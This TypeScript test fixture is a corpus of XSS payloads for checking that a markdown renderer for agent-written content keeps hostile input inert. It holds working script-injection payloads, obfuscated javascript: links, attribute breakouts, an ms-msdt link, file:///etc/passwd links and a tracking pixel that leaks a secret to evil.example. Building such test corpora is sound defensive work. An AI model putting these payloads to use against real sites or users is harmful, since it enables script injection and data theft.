/**
 * Hostile markdown for every path that renders agent-written content (MarkdownView and everything
 * built on it: notes, script reader and preview). Each payload either carries script, a dangerous
 * URL, or markup that tries to break out of an attribute or an element. The tests assert on the
 * resulting DOM: none of it may become live.
 */
export interface XssPayload {
  name: string;
  markdown: string;
}

const TAB = "\t";

export const XSS_CORPUS: readonly XssPayload[] = [
  // Raw HTML must never be parsed
  { name: "script tag", markdown: "<script>alert(1)</script>" },
  { name: "img onerror", markdown: "<img src=x onerror=alert(1)>" },
  { name: "svg onload", markdown: "<svg onload=alert(1)>" },
  {
    name: "svg with script",
    markdown:
      '<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  },
  { name: "iframe javascript src", markdown: '<iframe src="javascript:alert(1)"></iframe>' },
  { name: "iframe srcdoc", markdown: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: "raw anchor javascript", markdown: '<a href="javascript:alert(1)">x</a>' },
  { name: "raw anchor onclick", markdown: '<a href="https://ok.example" onclick="alert(1)">x</a>' },
  { name: "object data", markdown: '<object data="javascript:alert(1)"></object>' },
  { name: "embed src", markdown: '<embed src="javascript:alert(1)">' },
  { name: "base href", markdown: '<base href="javascript:alert(1)//">' },
  {
    name: "meta refresh",
    markdown: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  },
  { name: "link stylesheet", markdown: "<link rel=stylesheet href=//evil.example/x.css>" },
  { name: "style block", markdown: "<style>*{background:url(javascript:alert(1))}</style>" },
  {
    name: "inline style attribute",
    markdown: '<p style="background:url(javascript:alert(1))">x</p>',
  },
  { name: "form action", markdown: '<form action="javascript:alert(1)"><button>x</button></form>' },
  { name: "input autofocus", markdown: "<input autofocus onfocus=alert(1)>" },
  {
    name: "details ontoggle",
    markdown: "<details open ontoggle=alert(1)><summary>x</summary></details>",
  },
  { name: "video onerror", markdown: "<video><source onerror=alert(1)></video>" },
  {
    name: "math mutation",
    markdown:
      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
  },
  { name: "comment trick", markdown: "<!--><script>alert(1)</script>-->" },
  { name: "split script tag", markdown: "<scr<script>ipt>alert(1)</scr</script>ipt>" },
  { name: "uppercase and spaces", markdown: "<SCRIPT >alert(1)</SCRIPT >" },
  { name: "template", markdown: "<template><script>alert(1)</script></template>" },

  // Dangerous URL schemes in markdown links
  { name: "link javascript", markdown: "[x](javascript:alert(1))" },
  { name: "link mixed case javascript", markdown: "[x](JaVaScRiPt:alert(1))" },
  { name: "link tab inside scheme", markdown: `[x](java${TAB}script:alert(1))` },
  { name: "link newline inside scheme", markdown: "[x](<java\nscript:alert(1)>)" },
  { name: "link entity-encoded scheme", markdown: "[x](&#106;avascript:alert(1))" },
  { name: "link hex entity scheme", markdown: "[x](&#x6A;avascript:alert(1))" },
  { name: "link colon entity", markdown: "[x](javascript&colon;alert(1))" },
  { name: "link percent-encoded", markdown: "[x](%6Aavascript:alert(1))" },
  { name: "link null byte", markdown: "[x](java\u0000script:alert(1))" },
  { name: "link leading space", markdown: "[x]( javascript:alert(1))" },
  { name: "link angle brackets", markdown: "[x](<javascript:alert(1)>)" },
  {
    name: "link data html",
    markdown: "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  },
  { name: "link data svg", markdown: '[x](data:image/svg+xml,<svg onload="alert(1)">)' },
  { name: "link vbscript", markdown: "[x](vbscript:msgbox(1))" },
  { name: "link file", markdown: "[x](file:///etc/passwd)" },
  { name: "link blob", markdown: "[x](blob:https://evil.example/6f1d)" },
  { name: "link intent", markdown: "[x](intent://scan/#Intent;scheme=zxing;end)" },
  {
    name: "link ms-msdt",
    markdown: "[x](ms-msdt:/id PCWDiagnostic /skip force /param IT_RebrowseForFile=?)",
  },
  { name: "link tel", markdown: "[x](tel:+10000000000)" },
  { name: "link protocol-relative", markdown: "[x](//evil.example/path)" },
  { name: "link root-relative", markdown: "[x](/auth/logout)" },
  { name: "link relative", markdown: "[x](../../etc/passwd)" },
  { name: "link credentials", markdown: "[x](https://trusted.example@evil.example/)" },
  { name: "link fullwidth scheme", markdown: "[x](ｊａｖａｓｃｒｉｐｔ:alert(1))" },
  { name: "reference-style javascript", markdown: "[ref]: javascript:alert(1)\n\n[click][ref]" },
  { name: "autolink javascript", markdown: "<javascript:alert(1)>" },
  {
    name: "autolink attribute breakout",
    markdown: '<https://evil.example/"onmouseover="alert(1)>',
  },
  { name: "bare url with quote", markdown: 'https://evil.example/" onmouseover="alert(1)' },
  {
    name: "title attribute breakout",
    markdown: '[x](https://evil.example "t\\" onmouseover=\\"alert(1)")',
  },
  { name: "footnote javascript", markdown: "Text[^1]\n\n[^1]: [x](javascript:alert(1))" },

  // Images: never loaded
  { name: "image javascript", markdown: "![x](javascript:alert(1))" },
  { name: "image tracking pixel", markdown: "![](https://evil.example/pixel.gif?leak=secret)" },
  { name: "image alt breakout", markdown: '![x"onerror="alert(1)](https://evil.example/a.png)' },
  {
    name: "image data uri",
    markdown: "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
  },
  { name: "image reference", markdown: "![x][i]\n\n[i]: https://evil.example/a.png" },

  // Injection through other markdown constructs
  { name: "table cell", markdown: "| a |\n| - |\n| <img src=x onerror=alert(1)> |" },
  { name: "emphasis wrapper", markdown: "**<img src=x onerror=alert(1)>**" },
  { name: "heading", markdown: "# <img src=x onerror=alert(1)>" },
  { name: "task list item", markdown: "- [x] <img src=x onerror=alert(1)>" },
  { name: "blockquote", markdown: "> <script>alert(1)</script>" },
  { name: "code fence", markdown: "```html\n<script>alert(1)</script>\n```" },
  { name: "inline code", markdown: "`<img src=x onerror=alert(1)>`" },
  {
    name: "html entity script",
    markdown: "&lt;script&gt;alert(1)&lt;/script&gt; &#60;script&#62;alert(1)&#60;/script&#62;",
  },
  { name: "many angle brackets", markdown: "<".repeat(5000) },
  { name: "deep nesting", markdown: `${"> ".repeat(60)}<script>alert(1)</script>` },
];
